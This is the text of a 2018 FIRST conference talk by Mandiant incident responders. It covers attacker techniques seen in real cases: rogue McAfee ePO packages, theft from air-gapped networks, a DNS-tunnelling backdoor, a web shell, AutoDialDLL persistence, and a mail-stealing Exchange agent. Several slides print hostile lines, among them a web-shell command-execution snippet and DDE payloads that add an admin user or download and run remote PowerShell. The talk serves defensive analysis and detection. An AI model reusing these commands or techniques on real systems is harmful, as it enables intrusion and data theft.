ATTACKER ANTICS
ILLUSTRATIONS OF INGENUITY

Bart Inglot and Vincent Wong

FIRST CONFERENCE 2018

2
Bart Inglot
 Principal Consultant at Mandiant  Incident Responder  Rock Climber  Globetrotter
 From Poland but live in Singapore  Spent 1 year in Brazil and 8 years in the UK  Learning French... poor effort!
 Twitter: @bartinglot
©2018 FireEye | Private & Confidential

3
Vincent Wong
 Principal Consultant at Mandiant  Incident Responder  Baby Sitter  3 years in Singapore  Grew up in Australia
©2018 FireEye | Private & Confidential

4
Disclosure Statement
" Case studies and examples are drawn from our experiences and activities working for a variety of customers, and do not represent our work for any one customer or set of customers. In many cases, facts have been changed to obscure the identity of our customers and individuals " associated with our customers.
©2018 FireEye | Private & Confidential

5
Today's Tales
1. AV Server Gone Bad 2. Stealing Secrets From An Air-Gapped Network 3. A Backdoor That Uses DNS for C2 4. Hidden Comment That Can Haunt You 5. A Little Known Persistence Technique 6. Securing Corporate Email is Tricky 7. Hiding in Plain Sight 8. Rewriting Import Table 9. Dastardly Diabolical Evil (aka DDE)
©2018 FireEye | Private & Confidential

6
AV SERVER GONE BAD
Cobalt Strike, PowerShell & McAfee ePO
(1/9)

7
AV Server Gone Bad ­ Background
 Attackers used Cobalt Strike (along with other malware)  Easily recognisable IOCs when recorded by Windows Event Logs
 Random service name ­ also seen with Metasploit  Base64-encoded script, "%COMSPEC%" and "powershell.exe"  Decoding the script yields additional PowerShell script with a base64-encoded GZIP stream that in turn
contained a base64-encoded Cobalt Strike "Beacon" payload.
A service was installed in the system. Service Name: 0f65bea Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkAT...
 Attackers used Cobalt Strike "Beacon" (mostly) with "named-pipe" to enable easy pivoting  Also made use of occasional external C2 with malleable profile ­ Amazon Books anyone?
 How to easily distribute the payload to systems?
©2018 FireEye | Private & Confidential

8
ePO Server traffic to multiple clients

©2018 FireEye | Private & Confidential

That can't be good!

Found "KB34535435.ps1" on ePO

9
 Found the file in multiple locations, including:  D:\Program Files (x86)\McAfee\ePolicy Orchestrator\DB\Software\Current \DLP_Agent\Install\0409
 Also found a RAR file:  D:\Program Files (x86)\McAfee\ePolicy Orchestrator\DB\repo.rar

©2018 FireEye | Private & Confidential

10
Attacking McAfee ePO
 Jérôme Nokin gave a talk in 2013 titled "Turning your managed Anti-Virus into my botnet" and also created "ePolicy 0wner"  https://funoverip.net/2013/12/turningyour-antivirus-into-my-botnet-owaspbenelux-2013-slides/  https://github.com/funoverip/epowner
 The "ePolicy 0wner" tool enables the ability to create rogue McAfee packages
 Attackers may have "borrowed" ideas from the tool
©2018 FireEye | Private & Confidential

11
ePolicy 0wner ­ Rogue Package Deployment
--cli-deploy
This mode hacks various files on the ePO server (such as catalog.z, PkgCatalog.z) and performs "Product Deployment" or "Command Execution" (with SYSTEM privs) on the managed stations. The ePO repository will be updated with your files, and also replicated on all Agent-Handlers (Multiple AgentHandler are typically used in large network with remote branch offices to reduce network traffic between the managed stations and the master ePO repository).
--file </path/to/file>
The file you would like to upload/exec on the victim(s). The file will be added to a new McAfee product and then deployed on the managed stations. The new product will also embed a batch file called 'run.bat' which contains something similar to 'start <your file>'. [...]
https://github.com/funoverip/epowner/blob/master/README
©2018 FireEye | Private & Confidential

12
What was in Repo.rar?
 The RAR file contained the necessary elements required for rogue package distribution and execution.
 The "run.bat" file seems familiar...
 Evidence found it was extracted on the ePO server.
©2018 FireEye | Private & Confidential

13
And in "run.bat"?
start "" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionPolicy bypass -noexit -file "%ALLUSERSPROFILE%\Application data\mcafee\common framework\current\DLP_Agent\Install\0409\KB34535435.ps1" && ping 127.0.0.1 -n 15 > nul
Remember "run.bat"? It contains something similar to `start <your file>'...
©2018 FireEye | Private & Confidential

14
STEALING SECRETS FROM AIR GAPPED NETWORKS
DETECTMON and MSSHELL
(2/9)

15
Background
 The victim used an air-gapped network to keep their Intellectual Property secure
 To move data between networks they used a specific brand of USB storage devices  Dedicated software to create encrypted containers (proprietary format)  256-bit AES encryption  Manufacturer claims the security is unbreakable
 The attackers staged the attack in 3 phases: 1. Identify systems of interest by deploying reconnaissance utilities 2. Research the security measures in place 3. Steal data from encrypted containers
 Attribution by iSIGHT Intelligence suggests a cyber-espionage group known as TICK
©2018 FireEye | Private & Confidential

16
Phase 1: Identify systems of interest
 NirSoft USBDeview (next slide)  Small GUI utility that lists currently and previously connected USB devices  Supports command-line arguments, e.g. export into a CSV file:
USBDeview.exe /scomma output.txt
 DETECTMON reconnaissance utility that monitors drive insertion and removal.  When the utility starts, it logs all connected drives  Logs when a removable drive is inserted or removed  The utility then runs the following:
cmd.exe /c dir <drive_root_path> /s >> <local_staging_path>\<year><month><day><hour>
 The "dir" command runs every 3 minutes while the drive is inserted
©2018 FireEye | Private & Confidential

17
NirSoft USBDeview
 http://www.nirsoft.net/utils/usb_devices_view.html
©2018 FireEye | Private & Confidential

18
Phase 2: Research the encrypted containers
 Strong crypto: 256-bit AES by default  Solution: ?
 Unknown file format and the container is split across a number of files  Solution: ?
 No disk mapping is created when accessed with a valid password ­ unlike TrueCrypt  Solution: ?
 Encryption chip in the USB device (unconfirmed)  Solution: ?
©2018 FireEye | Private & Confidential

19
Phase 2: Research the encrypted containers
 Strong crypto: 256-bit AES by default  Solution: capture the password
 Unknown file format and the container is split across a number of files  Solution: reverse-engineer the software / use APIs
 No disk mapping is created when accessed with a valid password ­ unlike TrueCrypt  Solution: dump the process / re-use the handle / use APIs
 Encryption chip in the USB device (unconfirmed)  Solution: monitor USB insertions and automatically steal predefined files
©2018 FireEye | Private & Confidential

20
Phase 3: Crack up the encrypted containers

 MSSHELL stealer searches newly-attached fixed and removable drives

Hash filenames

Match extension and size

Iterate different versions

Software Container Mount it

©2018 FireEye | Private & Confidential

21
Phase 3: Bonus
 DETECTMON steals unprotected files xcopy <DRIVE>:\*.* <local_staging_path>\<current_date>\ /E /I /Q /Y /EXCLUDE:<local_staging_path>\sys.txt
 Excluded items:  Encrypted containers  PE files  Adobe Reader (?)  Files specific to victim's environment
©2018 FireEye | Private & Confidential

22
Attribution
 TICK is a cyber espionage team that targets public and private interests in the Asia-Pacific region
 Active since at least 2009, maintained a low profile  Targeting of Chinese dissident organisations suggests
Chinese origin  Targeted industries include: defense, heavy industry,
aerospace, technology, banking, healthcare, automotive and media  Unconfirmed reporting by Symantec indicates targets in Australia, India, Singapore and USA  Custom Base64 alphabets / signed malware  Malware:  Fat Agent and PostBot ­ in the past  Nameless Hdoor and XXMM (aka Wali) ­ more recently  Various downloaders, launchers, infectors, uploaders
©2018 FireEye | Private & Confidential

OPSEC
 MSSHELL uses modified MD5  Single byte change of a constant in Round 3

23
0xfffaB3942

Pictures: "Fundamentals of Computer Security" by Pieprzyk, Josef (et al.)
©2018 FireEye | Private & Confidential

24
A BACKDOOR THAT USES DNS FOR C2
SOUNDBITE
(3/9)

25
SOUNDBITE ­ Capabilities
 Communicates with its command and control (C2) servers via DNS tunneling  Can use recursive DNS servers hindering detection  Provides an attacker the ability to
 create processes  upload and download files  execute shell commands  enumerate and manipulate files and directories  enumerate windows  manipulate the registry  gather system information
©2018 FireEye | Private & Confidential

SOUNDBITE ­ Beacon Example
©2018 FireEye | Private & Confidential

26
 280-byte DNS query  z.tonholding.com  z.nsquery.net
 NULL RR (Resource Record)  0x0a is NULL RR  0x01 is Internet Class
 First 6 bytes  Host identifier (stored in registry)
 Last 3 bytes  Counter (GetTickCount)
 Custom base64 dictionary

27

SOUNDBITE ­ Example of Supported Commands

Command 0x03 0x04
0x05
0x07
0x0A ...
0x10
...

Description
Start hidden window process <CommandArg0> with command line <CommandArg2>
Compress and upload file <CommandArg0> 1. Execute "C:\Windows\system32\cmd.exe /u /c <CommandArg0>" 2. Wait <CommandArg2> milliseconds for process to complete 3. Read response via created pipes, ZLIB-compress, and send Write data specified in <CommandArg2> to file <CommandArg0>; if file <CommandArg0>'s parent directory does not exist, create it Enumerate windows ... Move file specified in <CommandArg0> to <CommandArg2>
...

©2018 FireEye | Private & Confidential

28
SOUNDBITE ­ C2 Command Example

Offset 0x10 0x14 0x18 0x1c

Length 4 4 4 4

Description C2 command (Move File) Length of decompressed ZLIB data (168) Length of ZLIB-compressed data (92) ZLIB-compressed data (header: 0x789c)

©2018 FireEye | Private & Confidential

29
SOUNDBITE ­ Decompressed Command Example
 Arguments are length-value pairs, with a 4-byte value for length  Arguments are in Unicode  Example moves C:\Users\username\Desktop\oldfile to C:\Users\username\Desktop\newfile  Longer commands use more complex encoding and decoding technique with ZLIB
©2018 FireEye | Private & Confidential

30

SOUNDBITE ­ Host Based Indicators

Indicator Filename PE Resource

Value
Dropper: xwizard.exe (Unsigned) SndVolSSO.exe (Self-signed ­ Microsoft)
RT_RCDATA ZLIB-compressed copy of SndVolSSO.exe

Value
Dropper: mscorsvw.exe (Unsigned) csc.exe (Self-signed ­ Microsoft)
RT_HTML ZLIB-compressed copy of csc.exe

Registry

Software\INSUFFICIENT\INSUFFICIENT.INI

Software\NL2\NL.INI

Persistence (Service)

WcsPluginService\xa0 Windows Color System\xa0 C:\Windows\xwizard.exe /k wcssvc

MD5

02b2d905a72c4bb2abfc278b8ca7f722 5394b09cf2a0b3d1caaecc46c0e502e3

©2018 FireEye | Private & Confidential

clr_optimization_v2.0.50725_86
Microsoft .NET Framework NGEN v2.0.50725_X86
c:\Windows\Microsoft.NET\Framework\v2.0.50725\mscorsv w.exe /s netsvcs
e2d7d0021fd414349cbd95cd6a62f930 4f5a64c35d7b19a3143d2ca7b1c3264f

31
HIDDEN COMMENT THAT CAN HAUNT YOU
WEBSHELL
(4/9)

32
Quiz
 The attackers made a copy of "index.php" and then modified the original file
 Pseudo-code of what was introduced: now = datetime.now() total_minutes = ticks(now).minutes() value = total_minutes / 10 print("<!-- {ecd6899b-e8e6-44ea-8ff7-439" + value + "} -->")
 Example: <!-- {ecd6899b-e8e6-44ea-8ff7-439106071776} --!>
 What could it be for?
©2018 FireEye | Private & Confidential

33
Background
 Web Shells  Common technique for attackers to get back to the environment  Passive in nature  Difficult to detect ­ Use legitimate web server functionality ­ Size and language can vary greatly ­ Obfuscated / encrypted ­ Minimal logging for POST requests over HTTPS ­ Business applications vulnerable too
 Common examples:  China Chopper (next slide)  c99 PHP Shell  WSO Shell
©2018 FireEye | Private & Confidential

34
Example: China Chopper
 Server-side script  Client-side application
©2018 FireEye | Private & Confidential

35
©2018 FireEye | Private & Confidential

36
Password Protected Web Shell

 "index.php" was used to obtain the password

 "Timestomped" web shell placed on disk ("OTP-like"):

#1 now = datetime.now()

#2 total_minutes = ticks(now).minutes()

#3 value = total_minutes / 10

#4 password = "ABC123" + value

#5

#6 if (Cookies["Secret"] != password)

#7 {

#8

Redirect("https://<VICTIM>/index.php")

#9 }

#10 system($_GET["cmd"])

©2018 FireEye | Private & Confidential

37
A LITTLE KNOWN PERSISTENCE TECHNIQUE
KOMPROGO
(5/9)

KOMPROGO
Creates payload DLL in "%TEMP%\..\"
Creates mutex
Creates "Classes\CLSID\{53255E7F-D464-40FB-857DA2F9F0E1E397}\InprocServer32\"  Random executable  PE file from %ProgramFiles% and %SystemRoot%\system32 or
%SystemRoot%\SysWow64\ with resource directory  Target process used to load DLL payload as an argument Executes target process with DLL argument then loads payload and unloads itself
©2018 FireEye | Private & Confidential

38
COM Object Hijacking?

39
KOMPROGO ­ Persistence
 KOMPROGO uses "Services\WinSock2\Parameters\AutoDialDLL" for persistence  Mechanism is described by Hexacorn Ltd
 http://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/
 When Winsock library (ws2_32.dll) is invoked, it will load the DLL specified in "AutoDialDLL"  The key usually points to a legitimate, signed version of "rasadhlp.dll"  DLL must export 3 functions
 WSAttemptAutodialAddr  WSAttemptAutodialName  WSNoteSuccessfulHostentLookup
 KOMPROGO variants observed installed 32-bit and 64-bit DLLs and configured the registry value as appropriate
©2018 FireEye | Private & Confidential

40
SECURING CORPORATE EMAIL IS TRICKY
EXCHANGE TRANSPORT AGENT
(6/9)

41
Background
 The attackers objective: read emails across victim organisations  Most environments run Active Directory and Microsoft Exchange  Common attack angles:
 Mailbox exporting  Inbox forwarding rules  Transport rules  Mailbox delegation  Uncommon techniques  ISAPI Filter
­ Used for stealing user credentials  Exchange Transport Agent
­ Extension of Exchange transport behaviour ­ Available since at least Exchange Server 2010
©2018 FireEye | Private & Confidential

42
Extending Exchange Server
 The attackers dropped 3 components on the Exchange server 1) Transport agent ("agent.dll") ­ Load "miner.dll" ­ Capture sent messages by registering to a Routing Agent event ­ Extract metadata and the message content ­ Pass them to "miner.dll" 2) Mining component ("miner.dll") ­ Load and decrypt the configuration file ­ Mine the emails: · Encrypt and store on disk if criteria are met · Execute the command in the body and delete the email if sent by the attacker 3) Uploader ("stealer.ps1") ­ Exfiltrate encrypted files and clean up ­ Stored in registry + persistent via WMI + terminated unless parent process "wmiprvse.exe"
©2018 FireEye | Private & Confidential

43
Create a Transport Agent
 Template: https://msdn.microsoft.com
 Relevant cmdlets:  Install-TransportAgent  Enable-TransportAgent  Get-TransportAgent
 Detection:  Exchange logs (cmdlets)  Exchange server agents configuration ­ TransportRoles\Shared\agents.config
©2018 FireEye | Private & Confidential

44
Achieved Objectives

 Secure

Extensible

 Encryption: configuration file and mined emails  Independent components

 Kill-switch: free space or current date
 Anti-analysis: sandbox prevention & code obfuscation

 Remote code execution via emails from the attackers

 Uninstall: clean-up functionality was built in  Forgiving

 Customisable
 Configuration file: monitored inbox list and email ignore list

 Log errors to a file
 Automated  No need for remote access

©2018 FireEye | Private & Confidential

45
HIDING IN PLAIN SIGHT
SIMPLE TECHNIQUES USED BY SOUNDBITE AND KOMPROGO
(7/9)

46
SOUNDBITE Example

Service Name Display Name Image Path

WcsPluginService Windows Color System <???>

Which one is Legitimate?

Service Name Display Name Image Path

WcsPluginService Windows Color System <???>

©2018 FireEye | Private & Confidential

47
SOUNDBITE Example

Service Name Display Name Image Path

WcsPluginService Windows Color System %SystemRoot%\system32\svchost.exe -k wcssvc

Which one is Legitimate?

Service Name Display Name Image Path

WcsPluginService Windows Color System C:\Windows\xwizard.exe /k wcssvc

©2018 FireEye | Private & Confidential

48
SOUNDBITE Example

Service Name Display Name Image Path

WcsPluginService Windows Color System %SystemRoot%\system32\svchost.exe -k wcssvc

Which one is Legitimate?

Service Name Display Name Image Path

WcsPluginService Windows Color System C:\Windows\xwizard.exe /k wcssvc

©2018 FireEye | Private & Confidential

49

SOUNDBITE Example

Service Name Display Name Image Path

WcsPluginService Windows Color System C:\Windows\xwizard.exe /k wcssvc

Service Name Display Name Image Path

WcsPluginService\xa0 Windows Color System\xa0 C:\Windows\xwizard.exe /k wcssvc

 `NO-BREAK SPACE' (NBSP)  Unicode ­ U+00a0  UTF8 ­ 0xc2 0xa0  Looks just like a regular space (0x20) in most tools and applications  Administrators are unlikely to notice the subtle difference when looking at a list of services
©2018 FireEye | Private & Confidential

50
KOMPROGO Example
 KOMPROGO uses "Services\WinSock2\Parameters\AutodialDLL" for persistence  The key usually points to a legitimate, signed version of "rasadhlp.dll"  How would you populate the key with something that looks like "rasadhlp.dll"?
 No-Break Space (NBSP) is no good ­ it shows up as a space!
 `OPERATING SYSTEM COMMAND'  Unicode ­ U+009d  UTF8 ­ 0xc2 0x9d  Control character is not displayed in most applications ­ looks like "rasadhlp.dll"  No visual clues that something is amiss
©2018 FireEye | Private & Confidential

51
REWRITING IMPORT TABLE
AVOIDING STATIC IOCS
(8/9)

52
Indicator of Compromise (IOC)
 Way of describing threat data like  Malware  Attacker methodology  Evidence of compromise or activity
 OpenIOC was created around 2010  A format to organize indicators  Designed for data sharing  XML under the hood  Intentionally extensible
 Other formats: YARA, CybOX, STIX, etc.
©2018 FireEye | Private & Confidential

53
©2018 FireEye | Private & Confidential

54
Developing IOCs
Identify Malicious Activity

Find Evil

Collect and Analyse Data

©2018 FireEye | Private & Confidential

Test IOC (Reduce
FPs)

Create IOC

55
Let's signature a DLL

· Export DLL · Version
Information
File PE Metadata

Service Details
· Descriptive Name
· Arguments

· Size · Name · Location
File Properties

Strings
· PDB · Dialog · C2

· Unique functions

Other
·...

Opcode

©2018 FireEye | Private & Confidential

56
Evading Detection
 Malicious DLL persistent as a Windows service  Configured to launch the default export function ("ServiceMain")  Packed launcher for a second component
©2018 FireEye | Private & Confidential

57
Evading Detection
 Malicious DLL persistent as a Windows service  Configured to launch the default export function ("ServiceMain")  Packed launcher for a second component

©2018 FireEye | Private & Confidential

1. ServiceMain 2. ... 3. ...

Export Table is replaced when DLL is
loaded

58
DASTARDLY DIABOLICAL EVIL
PAYLOADS WITH DDE
(9/9)

Background
https://sensepost.com/blog/2016 /powershell-c-sharp-and-dde-thepower-within/
©2018 FireEye | Private & Confidential

59
https://sensepost.com/blog /2017/macro-less-codeexec-in-msword/

60

Dastardly Diabolical Evil...
ddeService="cmd" ddeTopic="/c calc"
Hash: 0de6260639da87a707fc379c1bbd765f8afff38ef793f9b910096ee723a49753

Really?

Hmm...

DDEAUTO c:\\windows\\system32\\cmd.exe "/k net user hacker P@ssw0rd! /add"
Hash: 3a42aecd1c4f67f0361c286fb6145577d2770cd1d98a209050094c83712a97cc

DDEAUTO c:\\windows\\system32\\cmd.exe "/k ipconfig"

;-(

Hash: c38ed9140e913d0d4c90e760ea9680ea6d1835ba85bb34787e4c38fc31f9e657

©2018 FireEye | Private & Confidential

61
Dastardly Diabolical Evil...
DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe $e=new-object -com internetexplorer.application; $e.visible=$true; $e.navigate2(` hxxps://i.ytimg.com/vi/ErLLFVf-0Mw/maxresdefault.jpg'); powershell -e $e"
Hash: 9d67659a41ef45219ac64967b7284dbfc435ee2df1fccf0ba9c7464f03fdc862
Promising! Did they poison Google?
©2018 FireEye | Private & Confidential

62
Dastardly Diabolical Evil...

©2018 FireEye | Private & Confidential

Injection into a Microsoft signed WSH script. Cobalt Strike with malleable C2.

Dastardly Diabolical Evil...

63
FIN7 Campaign Spoofed emails appearing to be from Securities and
Exchange Commission (SEC) Electronic Data Gathering, Analysis, and Retrieval (EDGAR) system.
POWERSOURCE.v2 C2 uses DNS TXT records

DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -C ;echo \"hxxps://sec.gov/\";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana.gov/fonts.txt'))"
Hash: 1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428
©2018 FireEye | Private & Confidential

64
RECAP
©2018 FireEye | Private & Confidential

Thank You
Email: vincent.wong@mandiant.com bartosz.inglot@mandiant.com

